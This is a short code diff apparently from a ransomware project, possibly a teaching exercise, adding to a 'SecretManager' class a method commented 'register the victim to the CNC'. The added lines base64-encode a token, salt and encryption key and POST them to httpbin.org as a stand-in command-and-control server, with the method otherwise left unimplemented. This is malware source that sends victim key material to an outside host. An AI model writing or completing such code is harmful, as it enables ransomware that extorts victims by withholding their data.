@@ -53,6 +53,13 @@ class SecretManager:
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         # register the victim to the CNC
+        url = 'https://httpbin.org/post'
+        data={
+            "token" : self.bin_to_b64(token),
+            "salt" : self.bin_to_b64(salt),
+            "key" : self.bin_to_b64(key)
+        }
+        response= requests.post(url,json = data) 
         raise NotImplemented()
 
     def setup(self)->None:
